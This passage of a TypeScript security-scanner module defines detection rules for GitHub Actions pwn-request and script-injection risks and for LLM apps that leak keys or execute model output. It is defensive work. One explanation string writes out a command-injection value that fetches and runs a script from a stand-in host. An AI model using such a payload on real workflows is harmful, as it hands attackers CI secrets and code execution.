/**
 * LLM application security (Vercel AI SDK, OpenAI, Anthropic, LangChain, MCP servers) and
 * GitHub Actions workflow security (AI-APP-xx / GHA-xx, Rule IDs 28201-28299).
 *
 * Sources: OWASP Top 10 for LLM Applications 2025 (LLM02/LLM05/LLM06), MCP security best practices,
 * GitHub Security Lab "Preventing pwn requests" parts 1-4, zizmor audits (dangerous-triggers,
 * template-injection, github-env, insecure-commands, artipacked, bot-conditions).
 * Rules already covered elsewhere are not repeated here: SEC-22 (LLM SDK in 'use client'), LLM-03 (#4003),
 * SAAS-07 (request data in the system prompt), CICD-SEC-01..05 (#9501-9505), SUPPLY-22/23.
 */
import type { Finding } from '@/data/schema';
import type { CodeFile } from '../scanner-engine';

interface Hit { ruleId: number; code: string; title: string; severity: Finding['severity']; category: string; lineIdx: number; why: string; fix: string }

const escapeRe = (s: string) => s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
const indentOf = (l: string) => l.length - l.trimStart().length;
const IDENT = /^[A-Za-z_$][\w$]*$/;

/* ------------------------------------------------------------------------------------------------ */
/* GitHub Actions helpers                                                                            */
/* ------------------------------------------------------------------------------------------------ */

/** Event names listed under the top-level `on:` key. */
function workflowTriggers(lines: string[]): Set<string> {
  const out = new Set<string>();
  const onIdx = lines.findIndex((l) => /^["']?(?:on|true)["']?\s*:/.test(l));
  if (onIdx === -1) return out;
  const block = [lines[onIdx].replace(/^["']?(?:on|true)["']?\s*:/, '')];
  for (let i = onIdx + 1; i < lines.length; i++) {
    if (lines[i].trim() && indentOf(lines[i]) === 0) break;
    // only the event keys, not their filters (branches / types / workflows lists)
    if (lines[i].trim()) block.push(lines[i].replace(/:.*$/, ':'));
  }
  const text = block.join('\n');
  for (const m of text.matchAll(/\b(pull_request_target|pull_request_review_comment|pull_request_review|pull_request|workflow_run|issue_comment|issues|discussion_comment|discussion|push|workflow_dispatch|schedule|release)\b/g)) out.add(m[1]);
  return out;
}

/** Range [start, end) of the YAML list item (step) that contains line idx. */
function stepRange(lines: string[], idx: number): [number, number] {
  let start = idx;
  for (let i = idx; i >= 0; i--) {
    if (/^\s*-\s/.test(lines[i]) && indentOf(lines[i]) <= indentOf(lines[idx])) { start = i; break; }
  }
  const dashIndent = indentOf(lines[start]);
  let end = lines.length;
  for (let i = start + 1; i < lines.length; i++) {
    if (lines[i].trim() && indentOf(lines[i]) <= dashIndent) { end = i; break; }
  }
  return [start, end];
}

/** Range [start, end) of the job (child of `jobs:`) that contains line idx. */
function jobRange(lines: string[], idx: number): [number, number] {
  const jobsIdx = lines.findIndex((l) => /^jobs\s*:/.test(l));
  if (jobsIdx === -1 || idx < jobsIdx) return [0, lines.length];
  const first = lines.findIndex((l, i) => i > jobsIdx && l.trim() !== '');
  if (first === -1) return [0, lines.length];
  const jobIndent = indentOf(lines[first]);
  let start = first;
  for (let i = idx; i > jobsIdx; i--) {
    if (lines[i].trim() && indentOf(lines[i]) === jobIndent) { start = i; break; }
  }
  let end = lines.length;
  for (let i = start + 1; i < lines.length; i++) {
    if (lines[i].trim() && indentOf(lines[i]) <= jobIndent) { end = i; break; }
  }
  return [start, end];
}

const isRunScriptLine = (lines: string[], idx: number): boolean => {
  if (/^\s*-?\s*(?:run|script)\s*:/.test(lines[idx])) return true;
  for (let i = idx - 1, indent = indentOf(lines[idx]); i >= 0; i--) {
    if (!lines[i].trim() || indentOf(lines[i]) >= indent) continue;
    return /^\s*-?\s*(?:run|script)\s*:/.test(lines[i]);
  }
  return false;
};

/** Whether a step after `afterIdx` in the same job executes code (run: or a local action). */
const runsCodeAfter = (lines: string[], afterIdx: number, jobEnd: number): boolean =>
  lines.slice(afterIdx, jobEnd).some((l) => /^\s*-?\s*run\s*:/.test(l) || /^\s*-?\s*uses\s*:\s*['"]?\.\//.test(l));

/** checkout steps: [usesLineIdx, stepStart, stepEnd] */
function checkoutSteps(lines: string[]): Array<[number, number, number]> {
  const out: Array<[number, number, number]> = [];
  lines.forEach((l, i) => {
    if (/^\s*-?\s*uses\s*:\s*['"]?actions\/checkout@/i.test(l)) {
      const [s, e] = stepRange(lines, i);
      out.push([i, s, e]);
    }
  });
  return out;
}

function evaluateWorkflow(lines: string[], hits: Hit[]): void {
  const triggers = workflowTriggers(lines);
  const text = lines.join('\n');
  const checkouts = checkoutSteps(lines);

  // GHA-01: pull_request_target checks out the PR head, then runs code with secrets and a write token
  if (triggers.has('pull_request_target')) {
    const prHeadRef = /\$\{\{\s*(?:github\.event\.pull_request\.(?:head\.(?:sha|ref|repo\.full_name)|merge_commit_sha|number)|github\.head_ref|github\.event\.number)\b|refs\/pull\//;
    for (const [, s, e] of checkouts) {
      const refIdx = lines.slice(s, e).findIndex((l) => /^\s*(?:ref|repository)\s*:/.test(l) && prHeadRef.test(l));
      if (refIdx === -1) continue;
      const [js, je] = jobRange(lines, s);
      const jobText = lines.slice(js, je).join('\n');
      const gated = /head\.repo\.full_name\s*==\s*github\.repository|github\.repository\s*==\s*github\.event\.pull_request\.head\.repo\.full_name|head\.repo\.fork\s*==\s*false|!\s*github\.event\.pull_request\.head\.repo\.fork|^\s*environment\s*:|labels\.\*\.name|github\.event\.label\.name/m.test(jobText);
      if (gated || !runsCodeAfter(lines, e, je)) continue;
      hits.push({
        ruleId: 28251, code: 'GHA-01', severity: 'CRITICAL', category: 'CI/CD Security', lineIdx: s + refIdx,
        title: 'pull_request_target Checks Out and Runs Untrusted PR Code (Pwn Request)',
        why: 'pull_request_target runs with repository secrets and a write-scoped GITHUB_TOKEN; checking out the fork\'s head and then running build/test steps executes attacker code (package.json scripts, Makefiles, local actions) with those privileges.',
        fix: 'Use the pull_request trigger for building untrusted code, or split into an unprivileged pull_request workflow plus a privileged workflow_run that never executes PR code. If PR code must run here, gate the job behind a protected environment with required reviewers.'
      });
      break;
    }
  }

  // GHA-02: workflow_run checks out the triggering (possibly fork) head and runs it
  if (triggers.has('workflow_run')) {
    const runHeadRef = /github\.event\.workflow_run\.(?:head_sha|head_branch|head_repository\.full_name|head_commit\.id)\b/;
    for (const [, s, e] of checkouts) {
      const refIdx = lines.slice(s, e).findIndex((l) => /^\s*(?:ref|repository)\s*:/.test(l) && runHeadRef.test(l));
      if (refIdx === -1) continue;
      const [js, je] = jobRange(lines, s);
      const scope = lines.slice(js, je).join('\n') + '\n' + text.split(/^jobs\s*:/m)[0];
      const gated = /workflow_run\.event\s*==\s*['"]push['"]|workflow_run\.event\s*!=\s*['"]pull_request['"]|workflow_run\.head_repository\.full_name\s*==\s*github\.repository|head_repository\.fork\s*==\s*false|^\s*environment\s*:/m.test(scope);
      if (gated || !runsCodeAfter(lines, e, je)) continue;
      hits.push({
        ruleId: 28252, code: 'GHA-02', severity: 'CRITICAL', category: 'CI/CD Security', lineIdx: s + refIdx,
        title: 'workflow_run Checks Out and Runs the Triggering PR Head (Pwn Request)',
        why: 'workflow_run workflows run in the base repository context with secrets and a write token even when the triggering run came from a fork PR; checking out workflow_run.head_sha/head_branch and running it executes the fork\'s code with those privileges.',
        fix: 'Never execute the triggering head in a workflow_run job. Pass results from the unprivileged workflow as artifacts treated strictly as data, or restrict the job with if: github.event.workflow_run.event == \'push\'.'
      });
      break;
    }
  }

  // GHA-03: attacker-controlled contexts not covered by CICD-SEC-03 expanded inside run:/script:
  const untrustedEvent = ['pull_request_target', 'pull_request', 'issues', 'issue_comment', 'discussion', 'discussion_comment', 'pull_request_review', 'pull_request_review_comment', 'workflow_run'].some((t) => triggers.has(t));
  const extraContext = /\$\{\{\s*(?:github\.event\.workflow_run\.(?:head_branch|display_title|head_commit\.(?:message|author\.(?:name|email))|pull_requests\[[^\]]*\]\.head\.ref)\b|github\.event\.pull_request\.head\.repo\.(?:description|homepage)\b)/i;
  const toJsonContext = /\$\{\{\s*toJson\(\s*github(?:\.event(?:\.(?:pull_request|issue|comment|review|review_comment|discussion|head_commit|commits|workflow_run))?)?\s*\)/i;
  const injIdx = lines.findIndex((l, i) => (extraContext.test(l) || (untrustedEvent && toJsonContext.test(l))) && isRunScriptLine(lines, i));
  if (injIdx !== -1) {
    hits.push({
      ruleId: 28253, code: 'GHA-03', severity: 'CRITICAL', category: 'Command Injection', lineIdx: injIdx,
      title: 'Script Injection via workflow_run / toJSON(github.event) Expression in run:',
      why: '${{ }} is substituted into the shell script before it runs. Fork branch names, commit messages, PR titles and descriptions (also inside toJSON(github.event)) are attacker-controlled, so a value like `a";curl evil.sh|sh;"` executes in the runner with the workflow token and secrets.',
      fix: 'Map the value to an environment variable (env: HEAD_BRANCH: ${{ github.event.workflow_run.head_branch }}) and reference it quoted as "$HEAD_BRANCH" in the script.'
    });
  }

  // GHA-04: issue_comment workflow checks out PR code without checking the commenter's permission
  if (triggers.has('issue_comment')) {
    const commentPrRef = /refs\/pull\/|github\.event\.issue\.number|steps\.[\w-]+\.outputs\.[\w-]*(?:sha|ref|head)/i;
    const permissionChecked = /author_association|getCollaboratorPermissionLevel|collaborators\/[^\s]*\/permission|\/permission\b|github\.event\.comment\.user\.login\s*==|^\s*environment\s*:/m.test(text);
    if (!permissionChecked) {
      let idx = -1;
      for (const [, s, e] of checkouts) {
        const refIdx = lines.slice(s, e).findIndex((l) => /^\s*ref\s*:/.test(l) && commentPrRef.test(l));
        if (refIdx !== -1 && runsCodeAfter(lines, e, jobRange(lines, s)[1])) { idx = s + refIdx; break; }
      }
      if (idx === -1) idx = lines.findIndex((l, i) => /\bgh\s+pr\s+checkout\b/.test(l) && isRunScriptLine(lines, i));
      if (idx !== -1) {
        hits.push({
          ruleId: 28254, code: 'GHA-04', severity: 'HIGH', category: 'CI/CD Security', lineIdx: idx,
          title: 'Comment-Triggered Workflow Runs PR Code Without a Permission Check',
          why: 'issue_comment workflows run with secrets and a write token, and anyone can comment on a public PR. Checking out the PR head on a comment like "/test" without verifying the commenter lets any user run fork code with those privileges.',
          fix: 'Gate the job on the commenter\'s role (if: contains(fromJSON(\'["OWNER","MEMBER","COLLABORATOR"]\'), github.event.comment.author_association)) and pin the checkout to the SHA that was reviewed.'
        });
      }
    }
  }

  // GHA-05: GITHUB_ENV / GITHUB_PATH filled from downloaded artifact contents in a privileged workflow
  if ((triggers.has('workflow_run') || triggers.has('pull_request_target')) && /actions\/download-artifact@|action-download-artifact@|listWorkflowRunArtifacts|gh\s+run\s+download/.test(text)) {
    const envIdx = lines.findIndex((l, i) => />>\s*["']?\$\{?(?:GITHUB_ENV|GITHUB_PATH)\b/.test(l) && /\$\(|`|\bcat\s|\bunzip\b|\bjq\b/.test(l) && isRunScriptLine(lines, i));
    if (envIdx !== -1) {
      hits.push({
        ruleId: 28255, code: 'GHA-05', severity: 'HIGH', category: 'CI/CD Security', lineIdx: envIdx,
        title: 'Artifact Contents Written to GITHUB_ENV / GITHUB_PATH in a Privileged Workflow',
        why: 'Artifacts uploaded by the unprivileged PR run are attacker-controlled. Writing their contents to $GITHUB_ENV lets a newline in the file define extra variables (LD_PRELOAD, BASH_ENV, NODE_OPTIONS), and $GITHUB_PATH shadows binaries, giving code execution in the privileged job.',
        fix: 'Treat artifact contents as data: validate them strictly (e.g. digits only for a PR number) and pass them through $GITHUB_OUTPUT or step env, never $GITHUB_ENV / $GITHUB_PATH.'
      });
    }
  }

  // GHA-06: deprecated set-env / add-path workflow commands re-enabled
  const unsecureIdx = lines.findIndex((l) => /ACTIONS_ALLOW_UNSECURE_COMMANDS\s*[:=]\s*["']?true/i.test(l));
  if (unsecureIdx !== -1) {
    hits.push({
      ruleId: 28256, code: 'GHA-06', severity: 'HIGH', category: 'CI/CD Security', lineIdx: unsecureIdx,
      title: 'Insecure Workflow Commands Re-Enabled (ACTIONS_ALLOW_UNSECURE_COMMANDS)',
      why: 'This re-enables ::set-env and ::add-path (CVE-2020-15228): any step that prints untrusted text (test output, PR titles, fetched content) can inject environment variables or PATH entries and take over later steps.',
      fix: 'Remove ACTIONS_ALLOW_UNSECURE_COMMANDS and use the $GITHUB_ENV / $GITHUB_PATH environment files instead of the deprecated commands.'
    });
  }

  // GHA-07: ArtiPACKED - persisted checkout credentials uploaded with the whole workspace
  const leakyCheckout = checkouts.some(([u, s, e]) => /actions\/checkout@v[1-5]\b/i.test(lines[u]) && !lines.slice(s, e).some((l) => /persist-credentials\s*:\s*["']?false/i.test(l)));
  if (leakyCheckout) {
    lines.forEach((l, i) => {
      if (hits.some((h) => h.ruleId === 28257)) return;
      const m = l.match(/^\s*-?\s*uses\s*:\s*['"]?actions\/upload-artifact@v(\d+)/i);
      if (!m) return;
      const [s, e] = stepRange(lines, i);
      const step = lines.slice(s, e);
      const pathIdx = step.findIndex((x) => /^\s*path\s*:\s*["']?(?:\.\/?|\.\/\*|\$\{\{\s*github\.workspace\s*\}\}\/?)["']?\s*$/.test(x));
      const hidden = Number(m[1]) < 4 || step.some((x) => /include-hidden-files\s*:\s*["']?true/i.test(x));
      if (pathIdx !== -1 && hidden) {
        hits.push({
          ruleId: 28257, code: 'GHA-07', severity: 'HIGH', category: 'Credential Exposure', lineIdx: s + pathIdx,
          title: 'Workspace Uploaded as Artifact With Persisted Git Credentials (ArtiPACKED)',
          why: 'actions/checkout (before v6) stores the token in .git/config unless persist-credentials: false. Uploading the whole workspace including hidden files publishes that token in a downloadable artifact (public on public repos).',
          fix: 'Set persist-credentials: false on actions/checkout and upload only the build output directory (path: dist/), without include-hidden-files.'
        });
      }
    });
  }

  // GHA-08: spoofable bot identity check in a privileged trigger
  if (triggers.has('pull_request_target') || triggers.has('workflow_run')) {
    const botIdx = lines.findIndex((l) => /\bif\s*:/.test(l) && /github\.actor\s*==\s*['"][\w-]+\[bot\]['"]/.test(l));
    if (botIdx !== -1) {
      hits.push({
        ruleId: 28258, code: 'GHA-08', severity: 'MEDIUM', category: 'CI/CD Security', lineIdx: botIdx,
        title: 'Spoofable Bot Check (github.actor) Guards a Privileged Workflow',
        why: 'github.actor is whoever last acted on the PR, not its author: an attacker can get a bot (e.g. Dependabot via @dependabot recreate on a fork) to be the actor of a PR carrying their commits, passing the check with secrets in scope.',
        fix: 'Check the PR author instead (github.event.pull_request.user.login == \'dependabot[bot]\') and verify the head repository is this repository.'
      });
    }
  }
}

/* ------------------------------------------------------------------------------------------------ */
/* LLM application helpers                                                                           */
/* ------------------------------------------------------------------------------------------------ */

const PUBLIC_LLM_KEY = /\b((?:NEXT_PUBLIC|VITE|REACT_APP|EXPO_PUBLIC|NUXT_PUBLIC|GATSBY|VUE_APP|PUBLIC)_(?:[A-Z0-9]+_)*?(?:OPENAI|ANTHROPIC|CLAUDE|GROQ|GEMINI|GOOGLE_GENERATIVE_AI|MISTRAL|COHERE|OPENROUTER|DEEPSEEK|XAI|GROK|PERPLEXITY|TOGETHER|REPLICATE|FIREWORKS|ELEVENLABS|HUGGINGFACE|HF)(?:_[A-Z0-9]+)*?_(?:API_)?(?:KEY|TOKEN|SECRET))\b/;

/** Variables / expressions holding raw model output in this file. */
function llmOutputArgPattern(lines: string[], isPy: boolean): string | null {
  const names = new Set<string>();
  const exprs: string[] = [];
  const addResult = (r: string) => exprs.push(String.raw`\b${escapeRe(r)}\s*\??\.\s*(?:text|object|output_text|content|choices)\b[\w$.?\[\]]*`);
  for (const l of lines) {
    let m: RegExpMatchArray | null;
    if (!isPy) {
      if ((m = l.match(/(?:const|let|var)\s*\{([^}]*)\}\s*=\s*await\s+(?:generateText|generateObject)\s*\(/))) {
        for (const part of m[1].split(',')) {
          const [key, alias] = part.split(':').map((x) => x.trim().replace(/\s*=.*$/, ''));
          if ((key === 'text' || key === 'object') && IDENT.test(alias || key)) names.add(alias || key);
        }
      }
      if ((m = l.match(/(?:const|let|var)\s+([A-Za-z_$][\w$]*)\s*=\s*await\s+(?:generateText|generateObject)\s*\(/))) addResult(m[1]);
      if ((m = l.match(/(?:const|let|var)\s+([A-Za-z_$][\w$]*)\s*=\s*await\s+[\w$.]+\.(?:chat\.completions|completions|messages|responses)\.create\s*\(/))) addResult(m[1]);
      if ((m = l.match(/(?:const|let|var)\s+([A-Za-z_$][\w$]*)\s*=\s*await\s+\w*(?:llm|model|chat)\w*\.invoke\s*\(/i))) addResult(m[1]);
    } else {
      if ((m = l.match(/^\s*([A-Za-z_]\w*)\s*=\s*(?:await\s+)?[\w.]+\.(?:chat\.completions|completions|messages|responses)\.create\s*\(/))) addResult(m[1]);
      if ((m = l.match(/^\s*([A-Za-z_]\w*)\s*=\s*(?:await\s+)?\w*(?:llm|model|chat)\w*\.a?invoke\s*\(/i))) addResult(m[1]);
    }
  }
  if (!names.size && !exprs.length) return null;
  // propagate through simple assignments: const code = completion.choices[0].message.content.trim()
  for (let pass = 0; pass < 3; pass++) {
    const src = [...[...names].map((n) => String.raw`\b${escapeRe(n)}\b`), ...exprs].join('|');
    const assign = isPy
      ? new RegExp(String.raw`^\s*([A-Za-z_]\w*)\s*(?::\s*\w+\s*)?=\s*(?:${src})(?:\s*\.\s*(?:strip|replace|removeprefix|removesuffix)\([^)]*\))*\s*(?:or\s+["'][^"']*["'])?\s*$`)
      : new RegExp(String.raw`(?:const|let|var)\s+([A-Za-z_$][\w$]*)\s*(?::\s*\w+\s*)?=\s*(?:${src})!?(?:\s*\??\.\s*(?:trim|replace|replaceAll|toString)\([^)]*\))*\s*(?:(?:\?\?|\|\|)\s*['"\x60][^'"\x60]*['"\x60])?\s*(?:as\s+\w+\s*)?;?\s*$`);
    let grew = false;
    for (const l of lines) {
      const m = l.match(assign);
      if (m && !names.has(m[1])) { names.add(m[1]); grew = true; }
    }
    if (!grew) break;
  }
  return [...[...names].map((n) => String.raw`\b${escapeRe(n)}\b`), ...exprs].map((p) => `(?:${p})`).join('|');
}

/** Parameter names of a JS destructuring / single-param list. */
function parseJsParams(raw: string): string[] {
  return raw.split(',').map((p) => {
    const noDefault = p.replace(/=.*$/, '').trim();
    const alias = noDefault.includes(':') ? noDefault.split(':')[1].trim() : noDefault;
    return alias.replace(/^\.\.\./, '');
  }).filter((p) => IDENT.test(p));
}

interface ToolHandler { line: number; params: string[]; body: string[]; context: string }

function jsToolHandlers(lines: string[]): ToolHandler[] {
  const handlers: ToolHandler[] = [];
  const seen = new Set<number>();
  const push = (idx: number, params: string[]) => {
    if (seen.has(idx) || !params.length) return;
    seen.add(idx);
    const body = [lines[idx]];
    const base = indentOf(lines[idx]);
    for (let i = idx + 1; i < lines.length && i < idx + 60; i++) {
      if (lines[i].trim() && indentOf(lines[i]) <= base) break;
      body.push(lines[i]);
    }
    handlers.push({ line: idx, params, body, context: lines.slice(Math.max(0, idx - 25), idx + 1).join('\n') });
  };
  lines.forEach((l, i) => {
    let m: RegExpMatchArray | null;
    if ((m = l.match(/\bexecute\s*:\s*async\s*\(\s*\{([^}]*)\}/)) || (m = l.match(/\basync\s+execute\s*\(\s*\{([^}]*)\}/)) || (m = l.match(/\btool\s*\(\s*async\s*\(\s*\{([^}]*)\}/))) {
      push(i, parseJsParams(m[1]));
    } else if ((m = l.match(/\b(?:execute|func)\s*:\s*async\s*\(\s*([A-Za-z_$][\w$]*)\s*(?::\s*[\w<>[\]]+\s*)?[,)]/))) {
      push(i, [m[1]]);
    } else if (/\.(?:tool|registerTool)\s*\(/.test(l)) {
      // MCP server.tool(name, [description], schema, async ({ a }) => ...)
      for (let j = i; j < Math.min(lines.length, i + 25); j++) {
        const h = lines[j].match(/\basync\s*\(\s*\{([^}]*)\}/);
        if (h) { push(j, parseJsParams(h[1])); break; }
      }
    }
  });
  return handlers;
}

function pyToolHandlers(lines: string[]): ToolHandler[] {
  const handlers: ToolHandler[] = [];
  lines.forEach((l, i) => {
    if (!/^\s*@(?:[\w.]+\.)?(?:tool|function_tool)\b/.test(l)) return;
    for (let j = i + 1; j < Math.min(lines.length, i + 4); j++) {
      const d = lines[j].match(/^\s*(?:async\s+)?def\s+\w+\s*\(([^)]*)\)/);
      if (!d) continue;
      const params = d[1].split(',').map((p) => p.trim()).filter((p) => !/Literal\[/.test(p))
        .map((p) => p.replace(/[:=].*$/, '').replace(/^\*+/, '').trim()).filter((p) => IDENT.test(p) && !['self', 'ctx', 'context', 'cls'].includes(p));
      const base = indentOf(lines[j]);
      const body = [lines[j]];
      for (let k = j + 1; k < lines.length; k++) {
        if (lines[k].trim() && indentOf(lines[k]) <= base) break;
        body.push(lines[k]);
      }
      if (params.length) handlers.push({ line: j, params, body, context: lines.slice(i, j + 1).join('\n') });
      break;
    }
  });
  return handlers;
}

/** Sink regexes for an argument pattern (`arg` is a regex source matching the tainted value). */
function codeExecSinks(arg: string, isPy: boolean, hasChildProcess: boolean): RegExp[] {
  const a = `(?:${arg})`;
  if (isPy) {
    const strArg = String.raw`(?:${a}|f["'][^"'\n]*\{\s*${a})`;
    return [
      new RegExp(String.raw`(?<![\w.])(?:eval|exec)\s*\(\s*${a}\s*[,)]`),
      new RegExp(String.raw`\bos\.(?:system|popen)\s*\(\s*${strArg}`),
      new RegExp(String.raw`\bsubprocess\.\w+\s*\(\s*${strArg}[^\n]*shell\s*=\s*True`)
    ];
  }
  const strArg = String.raw`(?:${a}\s*[,)]|\x60[^\x60]*\$\{\s*${a}\s*\}|['"][^'"]*['"]\s*\+\s*${a})`;
  const sinks = [
    new RegExp(String.raw`(?<![\w.$])eval\s*\(\s*${a}\s*\)`),
    new RegExp(String.raw`\bnew\s+Function\s*\([^)]*${a}\s*\)`),
    new RegExp(String.raw`\bvm\.(?:runInNewContext|runInThisContext|runInContext|compileFunction)\s*\(\s*${a}\s*[,)]|\bnew\s+vm\.Script\s*\(\s*${a}\s*[,)]`)
  ];
  if (hasChildProcess) {
    sinks.push(new RegExp(String.raw`(?:(?<![\w.$])|\b(?:child_process|childProcess|cp)\.)(?:exec|execSync|execFile|execFileSync)\s*\(\s*${strArg}`));
  }
  return sinks;
}

function fsSinks(arg: string, isPy: boolean): RegExp[] {
  const a = `(?:${arg})`;
  if (isPy) {
    return [
      new RegExp(String.raw`(?<![\w.])open\s*\(\s*(?:${a}\s*[,)]|f["'][^"'\n]*\{\s*${a}|os\.path\.join\([^)]*\b${a}\s*\))`),
      new RegExp(String.raw`\bPath\s*\(\s*${a}\s*\)\s*\.\s*(?:read_text|read_bytes|write_text|write_bytes|unlink|open)\b`),
      new RegExp(String.raw`\b(?:os\.remove|os\.unlink|shutil\.rmtree)\s*\(\s*${a}\s*\)`)
    ];
  }
  return [
    new RegExp(String.raw`\b(?:readFile|readFileSync|writeFile|writeFileSync|appendFile|appendFileSync|unlink|unlinkSync|rm|rmSync|createReadStream|createWriteStream|readdir|readdirSync)\s*\(\s*(?:${a}\s*[,)]|\x60[^\x60]*\$\{\s*${a}\s*\}|(?:path\.)?join\s*\([^)]*\b${a}\s*\))`)
  ];
}

/**
 * MCP resource read handlers (setRequestHandler(ReadResourceRequestSchema, ...), server.resource(...),
 * registerResource(...)) whose requested URI, template variables or a value derived from them reaches an
 * fs read without a containment check. Returns the sink line or -1.
 */
function mcpResourceFsRead(lines: string[]): number {
  for (let i = 0; i < lines.length; i++) {
    const l = lines[i];
    let start = -1;
    const taint = new Set<string>();
    const exprs: string[] = [];
    if (/setRequestHandler\s*\(\s*ReadResourceRequestSchema\b/.test(l)) {
      for (let j = i; j < Math.min(lines.length, i + 4); j++) {
        const h = lines[j].match(/async\s*\(\s*(\{[^)]*\}|[A-Za-z_$][\w$]*)/);
        if (!h) continue;
        start = j;
        if (/^\{/.test(h[1])) for (const id of h[1].match(/[A-Za-z_$][\w$]*/g) || []) { if (id !== 'params') taint.add(id); }
        else exprs.push(String.raw`\b${escapeRe(h[1])}\.params\.uri\b`);
        break;
      }
    } else if (/\.(?:resource|registerResource)\s*\(/.test(l)) {
      for (let j = i; j < Math.min(lines.length, i + 25); j++) {
        const h = lines[j].match(/async\s*\(\s*([^)]*)\)/);
        if (!h) continue;
        start = j;
        for (const id of h[1].replace(/:\s*[\w.<>[\]|]+/g, '').match(/[A-Za-z_$][\w$]*/g) || []) {
          if (!/^(?:extra|ctx|context|_\w*)$/.test(id)) taint.add(id);
        }
        break;
      }
    }
    if (start === -1 || (!taint.size && !exprs.length)) continue;
    const body = [lines[start]];
    const base = indentOf(lines[start]);
    for (let k = start + 1; k < lines.length && k < start + 60; k++) {
      if (lines[k].trim() && indentOf(lines[k]) <= base) break;
      body.push(lines[k]);
    }
    const bodyText = body.join('\n');
    if (/startsWith\(|path\.relative|\brelative\(|realpath|basename\(|includes\(\s*['"]\.\.['"]\)/.test(bodyText)) continue;
    const src = () => [...exprs, ...[...taint].map((t) => String.raw`\b${escapeRe(t)}\b`)].join('|');
    // one hop: const filePath = path.join(ROOT, uri.pathname) / fileURLToPath(uri) / new URL(request.params.uri).pathname
    for (const b of body) {
      const d = b.match(/\b(?:const|let)\s+([A-Za-z_$][\w$]*)\s*(?::[^=]+)?=\s*(.*)$/);
      if (d && new RegExp(src()).test(d[2])) taint.add(d[1]);
    }
    const sinks = fsSinks(src(), false);
    const off = body.findIndex((b) => sinks.some((re) => re.test(b)) || new RegExp(String.raw`\b(?:readFile|readFileSync|createReadStream)\s*\(\s*(?:new\s+URL\s*\(|fileURLToPath\s*\()\s*(?:${src()})`).test(b));
    if (off !== -1) return start + off;
  }
  return -1;
}

function evaluateLlmApp(file: CodeFile, raw: string, cleanContent: string, hits: Hit[]): void {
  const isPy = /\.py$/i.test(file.path);
  const lines = cleanContent.split('\n');
  const codeLines = isPy ? lines.map((l) => (/^\s*#/.test(l) ? '' : l)) : lines;
  const isClient = /^\s*['"]use client['"]/m.test(raw);

  // AI-APP-01: LLM provider secret behind a browser-exposed env prefix
  if (!isPy) {
    const keyIdx = codeLines.findIndex((l) => {
      const m = l.match(PUBLIC_LLM_KEY);
      if (!m) return false;
      const name = escapeRe(m[1]);
      const viaEnv = new RegExp(String.raw`(?:process\.env|import\.meta\.env|\benv)(?:\.${name}\b|\[\s*['"]${name}['"]\s*\])`).test(l);
      const viaSvelte = /from\s+['"]\$env\/(?:static|dynamic)\/public['"]/.test(l);
      const viaPlainPublic = m[1].startsWith('PUBLIC_') && !/import\.meta\.env|\$env\//.test(l);
      return (viaEnv || viaSvelte) && !viaPlainPublic;
    });
    if (keyIdx !== -1) {
      const name = (codeLines[keyIdx].match(PUBLIC_LLM_KEY) || ['', ''])[1];
      const surelyClient = isClient || /import\.meta\.env|\$env\//.test(codeLines[keyIdx]) || /^(?:VITE|REACT_APP|EXPO_PUBLIC|GATSBY|VUE_APP)_/.test(name);
      hits.push({
        ruleId: 28201, code: 'AI-APP-01', severity: surelyClient ? 'CRITICAL' : 'HIGH', category: 'AI & LLM Security', lineIdx: keyIdx,
        title: 'LLM Provider API Key Exposed Through a Public Env Prefix',
        why: `${name} uses a prefix the bundler inlines into browser JavaScript, so the provider key ships to every visitor and can be used to run models on your account (OWASP LLM02 / LLM10).`,
        fix: 'Rename the variable without the public prefix (OPENAI_API_KEY), read it only in server code (route handler / server action) and have the browser call that endpoint with auth and rate limits.'
      });
    }
  }

  // AI-APP-06: dangerouslyAllowBrowser outside a 'use client' file (SEC-22 covers those) with a bundled key
  if (!isPy && !isClient) {
    const dabIdx = codeLines.findIndex((l) => /dangerouslyAllowBrowser\s*:\s*true/.test(l));
    if (dabIdx !== -1) {
      const around = codeLines.slice(Math.max(0, dabIdx - 8), dabIdx + 9).join('\n');
      const keyLine = around.match(/apiKey\s*:\s*([^,\n]+)/);
      const bundledKey = keyLine && (/import\.meta\.env\.|process\.env\.(?:NEXT_PUBLIC|REACT_APP|EXPO_PUBLIC|VITE|GATSBY|VUE_APP)_/.test(keyLine[1]) || /^['"\x60]sk-/.test(keyLine[1].trim()));
      const alreadyReported = keyLine && PUBLIC_LLM_KEY.test(keyLine[1]) && hits.some((h) => h.ruleId === 28201);
      if (bundledKey && !alreadyReported) {
        hits.push({
          ruleId: 28206, code: 'AI-APP-06', severity: 'HIGH', category: 'AI & LLM Security', lineIdx: dabIdx,
          title: 'LLM SDK Used in the Browser With a Bundled API Key (dangerouslyAllowBrowser)',
          why: 'dangerouslyAllowBrowser: true lets the OpenAI/Anthropic SDK run in a front-end bundle; the apiKey it is given is a build-time value, so the key is readable in the shipped JavaScript.',
          fix: 'Move the model call to a backend endpoint that holds the key. Only use dangerouslyAllowBrowser with a key the end user supplies themselves or a short-lived ephemeral token.'
        });
      }
    }
  }

  // AI-APP-02 / AI-APP-03: raw model output executed as code, shell or SQL
  const hasChildProcess = /['"](?:node:)?child_process['"]/.test(cleanContent);
  const taint = llmOutputArgPattern(codeLines, isPy);
  if (taint) {
    const execSinks = codeExecSinks(taint, isPy, hasChildProcess);
    const execIdx = codeLines.findIndex((l) => execSinks.some((re) => re.test(l)));
    if (execIdx !== -1) {
      hits.push({
        ruleId: 28202, code: 'AI-APP-02', severity: 'CRITICAL', category: 'AI & LLM Security', lineIdx: execIdx,
        title: 'LLM Output Executed as Code or Shell Command',
        why: 'The model\'s response is passed straight to eval / Function / vm / a shell. Anyone who can influence the prompt or the documents it reads (prompt injection) chooses the code that runs on the server (OWASP LLM05 Improper Output Handling).',
        fix: 'Never execute model output on the host. Have the model return structured data validated with a schema and map it to fixed operations, or run generated code in an isolated sandbox (e.g. a microVM / E2B / isolated-vm) with no secrets or network.'
      });
    }
    const a = `(?:${taint})`;
    const sqlSinks = isPy
      ? [new RegExp(String.raw`\.(?:execute|executescript)\s*\(\s*(?:text\s*\(\s*)?${a}\s*[,)]`), new RegExp(String.raw`\bread_sql(?:_query)?\s*\(\s*${a}\s*[,)]`)]
      : [new RegExp(String.raw`\$(?:queryRawUnsafe|executeRawUnsafe)\s*\(\s*${a}\s*[,)]`), new RegExp(String.raw`\b(?:sql\.raw|\w+\.unsafe)\s*\(\s*${a}\s*[,)]`), new RegExp(String.raw`\.(?:query|execute|raw)\s*\(\s*${a}\s*[,)]`)];
